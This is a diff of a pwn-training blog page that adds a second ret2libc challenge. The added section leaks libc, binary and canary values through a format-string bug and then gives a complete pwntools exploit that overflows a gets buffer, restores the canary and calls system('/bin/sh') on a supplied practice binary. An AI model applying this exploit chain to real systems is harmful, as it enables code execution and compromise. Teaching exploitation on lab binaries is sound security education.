@@ -338,7 +338,7 @@ function googleTranslateElementInit() {
 
 
 
-    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 6 mins</span>
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 14 mins</span>
   </p>
 <div class="post-tags">
 <a class="post-tag" href="/tags.html#libc%20leak">#libc leak</a><a class="post-tag" href="/tags.html#ret2libc">#ret2libc</a>
@@ -374,22 +374,22 @@ function googleTranslateElementInit() {
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>checksec
 </code></pre></div></div>
 
-<p>RELRO:</p>
+<p><strong>RELRO</strong>:</p>
 <ul>
   <li>Partial RELRO - the got is writeable, nothing much to bother here.</li>
 </ul>
 
-<p>CANARY:</p>
+<p><strong>CANARY</strong>:</p>
 <ul>
   <li>No canary, we can do a overflow peacefully :)</li>
 </ul>
 
-<p>No eXecute:</p>
+<p><strong>No eXecute</strong>:</p>
 <ul>
   <li>NX Enabled - this makes sure that the code on the stack is not excecuted.</li>
 </ul>
 
-<p>PIE:</p>
+<p><strong>PIE</strong>:</p>
 <ul>
   <li>PIE Disabled, we know the address of all the code in the binary.</li>
 </ul>
@@ -400,7 +400,11 @@ function googleTranslateElementInit() {
 
 <p><img src="/assets/images/pwntraining3/pwntrain3.png" alt=""></p>
 
-<p>Its simple and easy, just overflow the buffer with garbage value and fill the return with… with… wait… with what ? Since there is no win function as such what exactly will we do ? Can we somehow get a shell by leaking something ? Lets look at the idea behind this challenge.</p>
+<ul>
+  <li>Since gets is a vulnerable function, we can use it to write more data than what the buffer can hold.</li>
+  <li>Also there are no win functions this time. We have to rely on the shared object.</li>
+  <li>Lets explore this challenge now.</li>
+</ul>
 
 <h4 id="global-offset-table">Global Offset Table:</h4>
 
@@ -408,11 +412,12 @@ function googleTranslateElementInit() {
 
 <h4 id="exploit-idea">Exploit Idea:</h4>
 
-<p>Our aim right now, is to leak an address in the libc (shared library). The reason is because we are not given any helper funciton in our program to get a shell, so we use the function in the libc called system with arguments “/bin/sh” to get a shell.</p>
+<ul>
+  <li>Our aim right now is to leak an address in the libc (shared library). Since ASLR will randomise the library we cant access the libc function with same address all the time.</li>
+  <li>There is a function called system in the libc which will pop a shell if we give the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> as the parameter.</li>
+</ul>
 
-<p>→ We can use the puts function since its already called by our program, so the GOT of this function will be resolved ( real address pointing to libc will be filled ).</p>
-
-<p>→ puts function takes one input which is the string to be printed. What if we can call puts with puts ?<img class="emoji" title=":thinking:" alt=":thinking:" raw="🤔" src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png" style="vertical-align: middle; display: inline; max-width: 1em; visibility: hidden;" onload="this.style.visibility='visible'" onerror="this.replaceWith(this.getAttribute('raw'))"></p>
+<p>→ We can use the puts function to call the got of puts, since its already called by our program, the GOT of this function will be resolved ( real address pointing to libc will be filled ).</p>
 
 <h4 id="pseudo-code">Pseudo code:</h4>
 
@@ -487,7 +492,144 @@ b* 0x00000000004011c7
 
 </code></pre></div></div>
 
-<h3 id="challenge-2">Challenge 2</h3>
+<h3 id="challenge-2">Challenge 2:</h3>
+
+<p>In this second challenge you are required to perform the same ret2libc but with more security measures to bypass. Below you can download source and bianry.</p>
+
+<p><a href="/assets/images/pwntraining3/ret2libc_canary">vuln binary</a> and 
+<a href="/assets/images/pwntraining3/ret2libc_canary.c">vuln c code</a></p>
+
+<h3 id="solution-1">Solution:</h3>
+<p>Lets do the drill of checking the mitigations.</p>
+
+<h4 id="mitigations-1">Mitigations:</h4>
+<p><img src="/assets/images/pwntraining3/pwntrain5.png" alt=""></p>
+
+<p><strong>Canary:</strong></p>
+<ul>
+  <li>A set of characters that will be checked before returning. If the value has changed the program aborts.</li>
+</ul>
+
+<p><strong>No eXecute:</strong></p>
+<ul>
+  <li>NX Enabled - this makes sure that the code on the stack is not excecuted.</li>
+</ul>
+
+<p><strong>PIE:</strong></p>
+<ul>
+  <li>PIE Enabled, We dont know the address of the code for the binary.</li>
+</ul>
+
+<h4 id="code-walkthrough-1">Code Walkthrough:</h4>
+
+<p>There is only a main function.
+<img src="/assets/images/pwntraining3/pwntrain6.png" alt=""></p>
+
+<p>We can see that, here we are getting an input and printing it in an unsafe way. Here we can take advantage of this to leak data in the binary. <a href="https://tourpran.me/pwn-training/2021/05/20/format-string-exploitation-training2.html">Not sure about format string ? Go Here</a>. In the next section we can use the gets function to input more data than the buffer can store.</p>
+
+<h4 id="canary">Canary:</h4>
+<p>Set of characters that is placed in between the return address and the buffer. When a buffer overflow occurs the canary checks itself with a memory copy. If the values has been modified then we know a overflow happened and the program will abort.</p>
+
+<p><img src="/assets/images/pwntraining3/pwntrain7.jpg" alt="drawing" width="500"></p>
+
+<blockquote>
+  <p>Bypass: Basically we can leak the canary from format strings and place the canary in the correct spot in the payload. Since we over write the canary with the real canary, it seems there was no overflow.</p>
+</blockquote>
+
+<h4 id="exploit-1">Exploit:</h4>
+
+<ul>
+  <li>Lets try to leak some variables from the stack by giving some %p.</li>
+  <li>We can store all of them in a list and analyse what is what.</li>
+</ul>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="c1"># phase 1 : leaking binary and libc address
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"So you wanna try again. Go ahead :)"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"%p "</span><span class="o">*</span><span class="mi">25</span><span class="p">)</span>
+<span class="n">all_leaked</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()).</span><span class="n">split</span><span class="p">()</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Info leaked: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/pwntraining3/pwntrain8.png" alt=""></p>
+
+<ul>
+  <li>We can confirm that the address <code class="language-plaintext highlighter-rouge">0x7ffff7faea03</code> is from the libc, nice ! we already got a leak. Attach gdb and check what the address corresponds to.</li>
+</ul>
+
+<p><img src="/assets/images/pwntraining3/pwntrain9.png" alt=""></p>
+
+<p>Ok this is a libc function, we can calculate the offset of this function from the libc base. Now lets see if any other important info is leaked.<img class="emoji" title=":thinking:" alt=":thinking:" raw="🤔" src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png" style="vertical-align: middle; display: inline; max-width: 1em; visibility: hidden;" onload="this.style.visibility='visible'" onerror="this.replaceWith(this.getAttribute('raw'))"></p>
+
+<p>Address that is <code class="language-plaintext highlighter-rouge">0x5555555550a0</code>, is a address that is winthin the binary, we can calculate the offset like the previous one.</p>
+
+<p>Finally lets see if the canary is also included in the stack. Yes it is indeed inside the stack and can clearly see it.</p>
+
+<p><img src="/assets/images/pwntraining3/pwntrain10.png" alt=""></p>
+
+<p>Now to find the position of canary we can set a break point in the address before the <code class="language-plaintext highlighter-rouge">__stack_chk_fail@plt</code>. The stack will be stored in the <code class="language-plaintext highlighter-rouge">RCX</code> register. Create a offset pattern then see what value is in the <code class="language-plaintext highlighter-rouge">RCX</code> register and place the canary value there to complete the exploit.</p>
+
+<p>Now it is simple. We can simply calculate all the relative offset from the base of binary and libc, So we can now <code class="language-plaintext highlighter-rouge">pop rdi</code> to populate it with the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> and call <code class="language-plaintext highlighter-rouge">system</code>. Below I have given the commented solution.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Set up pwntools for the correct architecture
+</span><span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">)</span>
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./ret2libc_canary'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ret2libc_canary"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="p">)</span>
+<span class="c1"># ./exploit.py DEBUG NOASLR
+</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+
+<span class="c1"># ./exploit.py GDB
+</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+b* main+164
+'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="c1">#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="c1"># phase 1 : leaking binary and libc address
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"So you wanna try again. Go ahead :)"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"%p "</span><span class="o">*</span><span class="mi">25</span><span class="p">)</span> <span class="c1"># send format specifier to leak data from the stack
+</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># recv the new line.
+</span>
+<span class="n">all_leaked</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()).</span><span class="n">split</span><span class="p">()</span> <span class="c1"># store all leaked data as a list.
+</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Info leaked: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">))</span> <span class="c1"># log it to make sure everything works fine
+</span><span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2013699</span> <span class="c1"># take the first element in the list which is a libc function.
+</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Libc Base: "</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)))</span> <span class="c1"># log it
+</span><span class="n">binary_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4256</span> <span class="c1"># calculate the binary offset from the leak.
+</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"binary_base: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">binary_base</span><span class="p">)))</span> <span class="c1"># log it
+</span><span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># store the canary from the leak
+</span>
+<span class="c1"># pahse 2 : usign the leak to ret2libc
+</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="c1"># fill the buffer till the canary and overwrite the canary with real one.
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x0000000000001016</span><span class="p">)</span> <span class="c1"># random garbage to fill the rbp
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x00000000000012cb</span><span class="p">)</span> <span class="c1"># return address
+</span><span class="k">print</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)))</span> <span class="c1"># find the address of libc bin/sh
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)))</span> 
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x0000000000001016</span><span class="p">)</span> <span class="c1"># return to make sure stack is aligned before a glibc call
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">)</span> <span class="c1"># call system.
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Missed again??? I'm so disappointed."</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
+
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Hope you loved this challenge in the training !! :D</p>
 
 
     </div>
@@ -499,10 +641,10 @@ b* 0x00000000004011c7
 <div class="post-related">
       <div>Related Articles</div>
       <ul>
-        <li><a class="post-link" href="/blogs/2021/03/27/sqlinjection.html" title="">SQL Injection</a></li>
-<li><a class="post-link" href="/writeup/2020/03/20/zhero-ctf.html" title="">c4n4ry Writeup | zh3r0 CTF</a></li>
-<li><a class="post-link" href="/blogs/2020/09/10/blog1.html" title="">Executable and Linkable Format - Sections and Segments</a></li>
+        <li><a class="post-link" href="/blogs/2020/09/10/blog1.html" title="">Executable and Linkable Format - Sections and Segments</a></li>
+<li><a class="post-link" href="/youtube/2020/07/28/introduction.html" title="">Introduction to Assembly Programming - 00</a></li>
 <li><a class="post-link" href="/pwn-training/2021/05/24/return2libcpwntrain.html" title="">Return to libc</a></li>
+<li><a class="post-link" href="/youtube/2020/08/01/video2.html" title="">Reverse engineering Binaries - 01</a></li>
 </ul>
     </div>
 <div class="post-comments">
